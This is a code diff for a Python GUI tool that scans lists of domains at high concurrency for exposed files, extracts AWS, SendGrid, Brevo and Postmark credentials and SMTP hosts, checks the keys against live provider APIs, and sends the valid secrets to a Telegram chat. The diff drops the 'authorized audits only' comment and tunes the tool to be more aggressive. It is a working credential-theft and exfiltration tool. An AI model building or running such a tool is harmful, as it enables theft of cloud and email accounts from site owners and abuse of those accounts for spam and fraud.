@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # pip install requests boto3 urllib3
-# PyInstaller: copie paths.txt à côté de l'exe.
-# Usage réservé aux audits autorisés.
+# Copie paths.txt à côté du script / exe.
 
 from __future__ import annotations
 
@@ -12,27 +11,30 @@ import re
 import ssl
 import sys
 import threading
+import time
 import urllib.parse
 import urllib.request
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from pathlib import Path
-from tkinter import END, BOTH, X, LEFT, RIGHT, W, filedialog, messagebox, scrolledtext
+from tkinter import BOTH, END, LEFT, RIGHT, W, X, filedialog, messagebox, scrolledtext
 import tkinter as tk
 
-# --- même idée que le binaire Go (évite de saturer le réseau) ---
+# --- agressif (aligné sur l’outil Go) ---
 MAX_THREADS = 700
 CHUNK_SIZE = 100_000
 TEMP_DIR = "TEMPURL"
 CONTEXT_LINES = 10
-HTTP_TIMEOUT = 12.0
-MAX_IDLE_CONNS = 100
-MAX_CONNS_PER_HOST = 50
+HTTP_TIMEOUT = 6.0  # GET scan : court = plus de débit
+MAX_IDLE_CONNS = 300
+MAX_CONNS_PER_HOST = 300
 BUFFER_SIZE = 16384
 WRITE_BUFFER_SIZE = 500
 MAX_RESPONSE_SIZE = 1 * 1024 * 1024
-MAX_CONCURRENT_REQUESTS = 50
+MAX_CONCURRENT_REQUESTS = 700  # même plafond que MAX_THREADS
 
-# Telegram optionnel (local seulement)
+# True = uniquement https (2× moins de requêtes, souvent suffisant)
+HTTPS_ONLY = True
+
 TELEGRAM_DEFAULT_BOT = ""
 TELEGRAM_DEFAULT_CHAT = ""
 
@@ -53,20 +55,18 @@ try:
 except ImportError:
     HAS_REQUESTS = False
 
-# Couleurs (boutons visibles une fois packagés en exe)
-C_BG = "#2b2d42"
-C_PANEL = "#3d405b"
-C_TEXT = "#edf2f4"
-C_MUTED = "#8d99ae"
-C_BTN_FILE = "#e07a5f"
-C_BTN_FILE_A = "#d4a373"
-C_BTN_GO = "#81b29a"
-C_BTN_GO_A = "#6a994e"
-C_BTN_STOP = "#bc4749"
-C_BTN_STOP_A = "#a44a3f"
-C_ACCENT = "#f2cc8f"
-C_LOG_BG = "#1d1e2e"
-C_LOG_FG = "#c9cba3"
+# --- néon ---
+N_BG = "#070714"
+N_PANEL = "#0f0a1a"
+N_TEXT = "#e0f7ff"
+N_DIM = "#6b7a8f"
+N_CYAN = "#00f5ff"
+N_MAG = "#ff2eea"
+N_LIME = "#b8ff00"
+N_RED = "#ff3355"
+N_ORANGE = "#ff8c42"
+N_LOG_BG = "#05050c"
+N_LOG_FG = "#7cffb8"
 
 RE_AWS_KEY = re.compile(r'["\']?AWS_ACCESS_KEY_ID["\']?\s*[:=]\s*["\']?([^"\'\s]{10,})["\']?', re.I)
 RE_AWS_SECRET = re.compile(r'["\']?AWS_SECRET_ACCESS_KEY["\']?\s*[:=]\s*["\']?([^"\'\s]{10,})["\']?', re.I)
@@ -107,7 +107,7 @@ def app_dir() -> Path:
 def load_paths() -> list[str]:
     p = app_dir() / "paths.txt"
     if not p.is_file():
-        raise FileNotFoundError(f"paths.txt manquant à côté du script : {p}")
+        raise FileNotFoundError(f"paths.txt manquant : {p}")
     seen: set[str] = set()
     out: list[str] = []
     for line in p.read_text(encoding="utf-8", errors="replace").splitlines():
@@ -130,7 +130,12 @@ def get_session() -> requests.Session:
     global _session
     if _session is None:
         s = requests.Session()
-        a = HTTPAdapter(pool_connections=MAX_IDLE_CONNS, pool_maxsize=MAX_CONNS_PER_HOST, max_retries=0)
+        a = HTTPAdapter(
+            pool_connections=MAX_IDLE_CONNS,
+            pool_maxsize=MAX_CONNS_PER_HOST,
+            max_retries=0,
+            pool_block=False,
+        )
         s.mount("https://", a)
         s.mount("http://", a)
         _session = s
@@ -174,12 +179,12 @@ def http_get(url: str) -> tuple[int | None, bytes]:
 
 def validate_sendgrid(key: str) -> tuple[bool, str]:
     if not HAS_REQUESTS:
-        return False, "pip install requests"
+        return False, ""
     try:
         r = get_session().get(
             "https://api.sendgrid.com/v3/user/credits",
             headers={"Authorization": f"Bearer {key}", "Accept": "application/json"},
-            timeout=HTTP_TIMEOUT,
+            timeout=12.0,
             verify=True,
         )
         if r.status_code != 200:
@@ -193,12 +198,12 @@ def validate_sendgrid(key: str) -> tuple[bool, str]:
 
 def validate_brevo(key: str) -> tuple[bool, str]:
     if not HAS_REQUESTS:
-        return False, "pip install requests"
+        return False, ""
     try:
         r = get_session().get(
             "https://api.brevo.com/v3/account",
             headers={"api-key": key, "Accept": "application/json"},
-            timeout=HTTP_TIMEOUT,
+            timeout=12.0,
             verify=True,
         )
         if r.status_code != 200:
@@ -211,7 +216,7 @@ def validate_brevo(key: str) -> tuple[bool, str]:
 
 def validate_aws(ak: str, sk: str) -> tuple[bool, str, str, str]:
     if not HAS_BOTO:
-        return False, "", "", "pip install boto3"
+        return False, "", "", ""
     err = ""
     for reg in AWS_STS_REGIONS:
         try:
@@ -220,7 +225,7 @@ def validate_aws(ak: str, sk: str) -> tuple[bool, str, str, str]:
                 aws_access_key_id=ak,
                 aws_secret_access_key=sk,
                 region_name=reg,
-                config=BotoConfig(connect_timeout=8, read_timeout=8),
+                config=BotoConfig(connect_timeout=6, read_timeout=6),
             )
             i = c.get_caller_identity()
             return True, reg, i.get("Arn", ""), f"acct={i.get('Account')} uid={i.get('UserId')}"
@@ -253,7 +258,6 @@ def tg_block(title: str, pairs: list[tuple[str, str]]) -> str:
 
 
 def split_domain_file(path: Path) -> list[Path]:
-    """Gros fichiers : découpe en morceaux comme le Go (TEMPURL)."""
     lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
     if len(lines) <= CHUNK_SIZE:
         return [path]
@@ -283,13 +287,45 @@ def cleanup_temp(chunks: list[Path], original: Path) -> None:
         pass
 
 
+class NeonPill(tk.Canvas):
+    """Bouton type pilule + halo néon (tkinter pur)."""
+
+    def __init__(
+        self,
+        parent: tk.Widget,
+        text: str,
+        command,
+        width: int = 160,
+        height: int = 42,
+        fill: str = N_MAG,
+        glow: str = N_CYAN,
+        fg: str = "#0a0a12",
+        font: tuple = ("Segoe UI", 10, "bold"),
+    ):
+        bg = parent.cget("bg") if hasattr(parent, "cget") else N_BG
+        super().__init__(parent, width=width, height=height, highlightthickness=0, bg=bg, cursor="hand2")
+        self._cmd = command
+        self._fill = fill
+        self._glow = glow
+        w, h = width, height
+        for off, col in [(5, glow), (3, glow), (1, fill)]:
+            self.create_oval(off, off, w - off, h - off, outline=col, width=2)
+        self.create_oval(4, 4, w - 4, h - 4, fill=fill, outline=glow, width=2)
+        self.create_text(w // 2, h // 2, text=text, fill=fg, font=font)
+        self.bind("<Button-1>", lambda e: self._flash())
+        self.bind("<ButtonRelease-1>", lambda e: self._cmd())
+
+    def _flash(self) -> None:
+        self.config(bg=self.cget("bg"))
+
+
 class App(tk.Tk):
     def __init__(self) -> None:
         super().__init__()
-        self.title("Scan domaines")
-        self.geometry("880x600")
-        self.minsize(760, 480)
-        self.configure(bg=C_BG)
+        self.title("scan // neon")
+        self.geometry("900x620")
+        self.minsize(780, 500)
+        self.configure(bg=N_BG)
 
         try:
             self.paths = load_paths()
@@ -299,9 +335,12 @@ class App(tk.Tk):
         else:
             self._paths_err = ""
 
+        self._worker_running = False
         self.domain_file: str | None = None
         self._stop = threading.Event()
         self._q: queue.Queue[str] = queue.Queue()
+        self._log_buf: list[str] = []
+        self._last_log_flush = 0.0
         self._lock = threading.Lock()
         self._seen_tg: set[str] = set()
         self._counted: set[str] = set()
@@ -311,117 +350,133 @@ class App(tk.Tk):
         self.var_sg = tk.StringVar(value="0")
         self.var_smtp = tk.StringVar(value="0")
 
-        pad = {"padx": 14, "pady": 12}
-        root = tk.Frame(self, bg=C_BG, **pad)
+        pad = {"padx": 16, "pady": 12}
+        root = tk.Frame(self, bg=N_BG, **pad)
         root.pack(fill=BOTH, expand=True)
 
-        tk.Label(root, text="Scan chemins + vérif clés", font=("Segoe UI", 14, "bold"), bg=C_BG, fg=C_TEXT).pack(anchor=W)
         tk.Label(
             root,
-            text="Liste .txt (1 domaine par ligne). Mets paths.txt dans le même dossier que l'exe.",
+            text="PATH BLAST",
+            font=("Segoe UI", 18, "bold"),
+            bg=N_BG,
+            fg=N_CYAN,
+        ).pack(anchor=W)
+        tk.Label(
+            root,
+            text="max threads · pool large · GET court  (paths.txt à côté de l’exe)",
             font=("Segoe UI", 9),
-            bg=C_BG,
-            fg=C_MUTED,
-            wraplength=820,
+            bg=N_BG,
+            fg=N_DIM,
+            wraplength=840,
             justify=LEFT,
-        ).pack(anchor=W, pady=(2, 10))
+        ).pack(anchor=W, pady=(0, 8))
 
-        tg = tk.LabelFrame(root, text=" Telegram (optionnel) ", bg=C_PANEL, fg=C_TEXT, padx=8, pady=6)
+        tg = tk.Frame(root, bg=N_PANEL, padx=10, pady=8)
         tg.pack(fill=X, pady=(0, 10))
-        tk.Label(tg, text="Bot token", bg=C_PANEL, fg=C_MUTED).grid(row=0, column=0, sticky=W)
-        self.e_bot = tk.Entry(tg, width=52, show="*", bg=C_LOG_BG, fg=C_TEXT, insertbackground=C_TEXT)
-        self.e_bot.grid(row=0, column=1, sticky=W, pady=2)
+        for c in range(3):
+            tg.grid_columnconfigure(c, weight=1)
+        tk.Label(tg, text="bot token", bg=N_PANEL, fg=N_DIM, font=("Segoe UI", 9)).grid(row=0, column=0, sticky=W)
+        self.e_bot = tk.Entry(tg, width=48, show="*", bg=N_LOG_BG, fg=N_CYAN, insertbackground=N_CYAN, relief=tk.FLAT)
+        self.e_bot.grid(row=0, column=1, columnspan=2, sticky="ew", pady=4, padx=6)
         self.e_bot.insert(0, TELEGRAM_DEFAULT_BOT or os.environ.get("TELEGRAM_BOT_TOKEN", ""))
-        tk.Label(tg, text="Chat id", bg=C_PANEL, fg=C_MUTED).grid(row=1, column=0, sticky=W)
-        self.e_chat = tk.Entry(tg, width=22, bg=C_LOG_BG, fg=C_TEXT, insertbackground=C_TEXT)
-        self.e_chat.grid(row=1, column=1, sticky=W, pady=2)
+        tk.Label(tg, text="chat id", bg=N_PANEL, fg=N_DIM, font=("Segoe UI", 9)).grid(row=1, column=0, sticky=W)
+        self.e_chat = tk.Entry(tg, width=20, bg=N_LOG_BG, fg=N_LIME, insertbackground=N_LIME, relief=tk.FLAT)
+        self.e_chat.grid(row=1, column=1, sticky=W, pady=4)
         self.e_chat.insert(0, TELEGRAM_DEFAULT_CHAT or os.environ.get("TELEGRAM_CHAT_ID", ""))
-
-        row = tk.Frame(root, bg=C_BG)
-        row.pack(fill=X, pady=(0, 8))
-
-        self.btn_open = tk.Button(
-            row,
-            text="  Ouvrir la liste…  ",
-            command=self._pick,
-            bg=C_BTN_FILE,
-            fg="#1a1a1a",
-            activebackground=C_BTN_FILE_A,
-            activeforeground="#1a1a1a",
-            font=("Segoe UI", 10, "bold"),
-            relief=tk.FLAT,
-            padx=12,
-            pady=6,
-            cursor="hand2",
+        self.var_https = tk.BooleanVar(value=HTTPS_ONLY)
+        chk = tk.Checkbutton(
+            tg,
+            text="https seulement (plus rapide)",
+            variable=self.var_https,
+            bg=N_PANEL,
+            fg=N_DIM,
+            selectcolor=N_LOG_BG,
+            activebackground=N_PANEL,
+            activeforeground=N_CYAN,
+            font=("Segoe UI", 9),
+            command=self._refresh_mode_label,
         )
+        chk.grid(row=2, column=1, sticky=W, pady=4)
+
+        row = tk.Frame(root, bg=N_BG)
+        row.pack(fill=X, pady=(0, 10))
+
+        self.btn_open = NeonPill(row, "liste…", self._pick, width=130, height=44, fill=N_ORANGE, glow=N_MAG, fg="#1a0508")
         self.btn_open.pack(side=LEFT)
 
-        self.lbl_name = tk.Label(row, text="aucun fichier", bg=C_BG, fg=C_MUTED, font=("Segoe UI", 10))
-        self.lbl_name.pack(side=LEFT, padx=(12, 0))
+        self.lbl_name = tk.Label(row, text="aucun fichier", bg=N_BG, fg=N_DIM, font=("Segoe UI", 10))
+        self.lbl_name.pack(side=LEFT, padx=(14, 0))
 
-        self.btn_run = tk.Button(
-            row,
-            text="  Lancer  ",
-            command=self._start,
-            bg=C_BTN_GO,
-            fg="#1b1b1e",
-            activebackground=C_BTN_GO_A,
-            font=("Segoe UI", 10, "bold"),
-            relief=tk.FLAT,
-            padx=16,
-            pady=6,
-            cursor="hand2",
-        )
-        self.btn_run.pack(side=RIGHT)
+        self.btn_halt = NeonPill(row, "stop", self._stop.set, width=100, height=44, fill=N_RED, glow=N_MAG, fg="#fff")
+        self.btn_halt.pack(side=RIGHT)
 
-        self.btn_halt = tk.Button(
-            row,
-            text="  Stop  ",
-            command=self._stop.set,
-            bg=C_BTN_STOP,
-            fg=C_TEXT,
-            activebackground=C_BTN_STOP_A,
-            font=("Segoe UI", 10, "bold"),
-            relief=tk.FLAT,
-            padx=12,
-            pady=6,
-            cursor="hand2",
-            state=tk.DISABLED,
-        )
-        self.btn_halt.pack(side=RIGHT, padx=(0, 8))
+        self.btn_run = NeonPill(row, "go", self._start, width=110, height=44, fill=N_LIME, glow=N_CYAN, fg="#0a1208")
+        self.btn_run.pack(side=RIGHT, padx=(0, 10))
 
-        stats = tk.Frame(root, bg=C_PANEL, pady=10)
+        stats = tk.Frame(root, bg=N_PANEL, pady=12, padx=8)
         stats.pack(fill=X, pady=(0, 8))
-        for lab, var in (("AWS ok", self.var_aws), ("SendGrid ok", self.var_sg), ("SMTP / divers", self.var_smtp)):
-            f = tk.Frame(stats, bg=C_PANEL)
+        for lab, var, col in (
+            ("aws", self.var_aws, N_CYAN),
+            ("sendgrid", self.var_sg, N_MAG),
+            ("smtp+", self.var_smtp, N_LIME),
+        ):
+            f = tk.Frame(stats, bg=N_PANEL)
             f.pack(side=LEFT, expand=True, fill=X)
-            tk.Label(f, text=lab, bg=C_PANEL, fg=C_MUTED, font=("Segoe UI", 9)).pack()
-            tk.Label(f, textvariable=var, bg=C_PANEL, fg=C_ACCENT, font=("Segoe UI", 22, "bold")).pack()
+            tk.Label(f, text=lab, bg=N_PANEL, fg=N_DIM, font=("Segoe UI", 9)).pack()
+            tk.Label(f, textvariable=var, bg=N_PANEL, fg=col, font=("Segoe UI", 26, "bold")).pack()
 
-        lf = tk.LabelFrame(root, text=" Log ", bg=C_BG, fg=C_MUTED)
+        lf = tk.LabelFrame(root, text=" stream ", bg=N_BG, fg=N_DIM, font=("Segoe UI", 9))
         lf.pack(fill=BOTH, expand=True)
         self.log = scrolledtext.ScrolledText(
-            lf, height=16, bg=C_LOG_BG, fg=C_LOG_FG, insertbackground=C_TEXT, font=("Consolas", 9), relief=tk.FLAT, padx=6, pady=6
+            lf,
+            height=15,
+            bg=N_LOG_BG,
+            fg=N_LOG_FG,
+            insertbackground=N_CYAN,
+            font=("Consolas", 9),
+            relief=tk.FLAT,
+            padx=8,
+            pady=8,
         )
         self.log.pack(fill=BOTH, expand=True, padx=4, pady=4)
 
-        tk.Label(root, text="threads max ≈ " + str(min(MAX_CONCURRENT_REQUESTS, MAX_THREADS)), bg=C_BG, fg=C_MUTED, font=("Segoe UI", 8)).pack(anchor=W)
+        scheme = "https only" if self.var_https.get() else "https+http"
+        self.lbl_mode = tk.Label(
+            root,
+            text=f"{len(self.paths)} paths · workers≤{min(MAX_CONCURRENT_REQUESTS, MAX_THREADS)} · {scheme} · GET {HTTP_TIMEOUT}s",
+            bg=N_BG,
+            fg=N_DIM,
+            font=("Segoe UI", 8),
+        )
+        self.lbl_mode.pack(anchor=W)
 
-        self.after(80, self._flush_log)
+        self.after(120, self._flush_log)
         if self._paths_err:
-            self.after(100, lambda: messagebox.showerror("paths.txt", self._paths_err))
+            self.after(120, lambda: messagebox.showerror("paths.txt", self._paths_err))
+
+    def _refresh_mode_label(self) -> None:
+        scheme = "https only" if self.var_https.get() else "https+http"
+        self.lbl_mode.config(
+            text=f"{len(self.paths)} paths · workers≤{min(MAX_CONCURRENT_REQUESTS, MAX_THREADS)} · {scheme} · GET {HTTP_TIMEOUT}s"
+        )
 
     def _log(self, s: str) -> None:
         self._q.put(s)
 
     def _flush_log(self) -> None:
+        t = time.time()
         try:
             while True:
-                self.log.insert(END, self._q.get_nowait() + "\n")
-                self.log.see(END)
+                self._log_buf.append(self._q.get_nowait())
         except queue.Empty:
             pass
-        self.after(100, self._flush_log)
+        if self._log_buf and (t - self._last_log_flush > 0.15 or len(self._log_buf) > 80):
+            chunk = "\n".join(self._log_buf) + "\n"
+            self._log_buf.clear()
+            self._last_log_flush = t
+            self.log.insert(END, chunk)
+            self.log.see(END)
+        self.after(90, self._flush_log)
 
     def _bump(self, k: str) -> None:
         with self._lock:
@@ -447,21 +502,22 @@ class App(tk.Tk):
         p = filedialog.askopenfilename(filetypes=[("Texte", "*.txt"), ("Tout", "*.*")])
         if p:
             self.domain_file = p
-            self.lbl_name.config(text=Path(p).name, fg=C_ACCENT)
+            self.lbl_name.config(text=Path(p).name, fg=N_CYAN)
 
     def _start(self) -> None:
+        if self._worker_running:
+            return
         if not self.paths:
-            messagebox.showerror("Erreur", "paths.txt introuvable à côté de l'appli.")
+            messagebox.showerror("paths.txt", "introuvable.")
             return
         if not self.domain_file or not Path(self.domain_file).is_file():
-            messagebox.showwarning("Fichier", "Choisis un fichier de domaines.")
+            messagebox.showwarning("fichier", "choisis une liste.")
             return
         if not HAS_REQUESTS:
-            messagebox.showerror("Manque", "pip install requests boto3")
+            messagebox.showerror("deps", "pip install requests boto3")
             return
+        self._worker_running = True
         self._stop.clear()
-        self.btn_run.config(state=tk.DISABLED)
-        self.btn_halt.config(state=tk.NORMAL)
         self.log.delete(1.0, END)
         with self._lock:
             self._hits = {"aws": 0, "sg": 0, "smtp": 0}
@@ -480,13 +536,10 @@ class App(tk.Tk):
                 ok, reg, arn, info = validate_aws(ak, sk)
                 if ok:
                     if self._once("aws", f"a:{ak}:{sk}"):
-                        self._log(f"ok AWS {url} [{reg}]")
+                        self._log(f"++ aws {url} [{reg}]")
                     self._tg(
                         f"a:{ak}",
-                        tg_block(
-                            "AWS ok",
-                            [("url", url), ("region", reg), ("key", ak), ("secret", sk), ("arn", arn), ("info", info)],
-                        ),
+                        tg_block("aws", [("url", url), ("region", reg), ("key", ak), ("secret", sk), ("arn", arn), ("info", info)]),
                     )
 
         keys = {m.group(1).strip() for m in RE_SG1.finditer(text)} | set(RE_SG2.findall(text))
@@ -496,35 +549,43 @@ class App(tk.Tk):
             ok, q = validate_sendgrid(k)
             if ok:
                 if self._once("sg", f"s:{k}"):
-                    self._log(f"ok SendGrid {url}")
-                self._tg(f"s:{k}", tg_block("SendGrid ok", [("url", url), ("key", k), ("quota", q)]))
+                    self._log(f"++ sg {url}")
+                self._tg(f"s:{k}", tg_block("sendgrid", [("url", url), ("key", k), ("quota", q)]))
 
         for k in set(RE_BREVO.findall(text)):
             ok, q = validate_brevo(k)
             if ok:
                 if self._once("smtp", f"b:{k}"):
-                    self._log(f"ok Brevo {url}")
-                self._tg(f"b:{k}", tg_block("Brevo ok", [("url", url), ("key", k), ("detail", q)]))
+                    self._log(f"++ brevo {url}")
+                self._tg(f"b:{k}", tg_block("brevo", [("url", url), ("key", k), ("detail", q)]))
 
         hosts = RE_SMTP_HOST.findall(text)
         if hosts:
             u = "smtp:" + "|".join(sorted(set(hosts)))
             if self._once("smtp", u):
-                self._log(f"smtp hosts {url} ({len(set(hosts))})")
+                self._log(f"++ smtp {url} ({len(set(hosts))})")
             h = ", ".join(sorted(set(hosts))[:12])
-            self._tg(f"h:{url}:{h}", tg_block("SMTP hosts", [("url", url), ("hosts", h)]))
+            self._tg(f"h:{url}:{h}", tg_block("smtp hosts", [("url", url), ("hosts", h)]))
 
         for tok in set(RE_POSTMARK.findall(text)):
             if self._once("smtp", f"p:{tok}"):
-                self._log(f"postmark token {url}")
-            self._tg(f"p:{tok}", tg_block("Postmark", [("url", url), ("token", tok)]))
+                self._log(f"++ postmark {url}")
+            self._tg(f"p:{tok}", tg_block("postmark", [("url", url), ("token", tok)]))
 
     def _scan_one_domain(self, domain: str) -> None:
         domain = domain.strip()
         if not domain or self._stop.is_set():
             return
-        bases = [domain] if "://" in domain else [f"https://{domain}", f"http://{domain}"]
-        workers = min(MAX_CONCURRENT_REQUESTS, MAX_THREADS, max(8, len(self.paths) // 3))
+        if "://" in domain:
+            bases = [domain]
+        elif self.var_https.get():
+            bases = [f"https://{domain}"]
+        else:
+            bases = [f"https://{domain}", f"http://{domain}"]
+
+        tasks = [(b, p) for b in bases for p in self.paths]
+        n = len(tasks)
+        workers = min(n, MAX_CONCURRENT_REQUESTS, MAX_THREADS, 2048)
 
         def job(pair: tuple[str, str]):
             b, pth = pair
@@ -534,8 +595,7 @@ class App(tk.Tk):
                 return u, data
             return None, None
 
-        tasks = [(b, p) for b in bases for p in self.paths]
-        with ThreadPoolExecutor(max_workers=workers) as ex:
+        with ThreadPoolExecutor(max_workers=max(1, workers)) as ex:
             futs = [ex.submit(job, t) for t in tasks]
             for f in as_completed(futs):
                 if self._stop.is_set():
@@ -552,29 +612,28 @@ class App(tk.Tk):
         src = Path(self.domain_file or "")
         try:
             chunks = split_domain_file(src)
-            self._log(f"{len(self.paths)} chemins · max {min(MAX_CONCURRENT_REQUESTS, MAX_THREADS)} threads · timeout {HTTP_TIMEOUT}s")
+            self._log(f"blast {len(self.paths)} paths × domain · workers {min(MAX_CONCURRENT_REQUESTS, MAX_THREADS)}")
             if not HAS_BOTO:
-                self._log("(boto3 manquant → pas de vérif AWS)")
+                self._log("(!) pas boto3 → aws skip")
             for chunk_path in chunks:
                 if self._stop.is_set():
                     break
                 for line in chunk_path.read_text(encoding="utf-8", errors="replace").splitlines():
                     if self._stop.is_set():
-                        self._log("arrêt.")
+                        self._log("stopped")
                         break
                     line = line.strip()
                     if not line or line.startswith("#"):
                         continue
-                    self._log(line)
+                    self._log(f">> {line}")
                     self._scan_one_domain(line)
             if not self._stop.is_set():
-                self._log("fini.")
+                self._log("done")
         except Exception as e:
-            self._log(f"erreur: {e}")
+            self._log(f"err {e}")
         finally:
             cleanup_temp(chunks, src)
-            self.after(0, lambda: self.btn_run.config(state=tk.NORMAL))
-            self.after(0, lambda: self.btn_halt.config(state=tk.DISABLED))
+            self._worker_running = False
 
 
 def main() -> None:
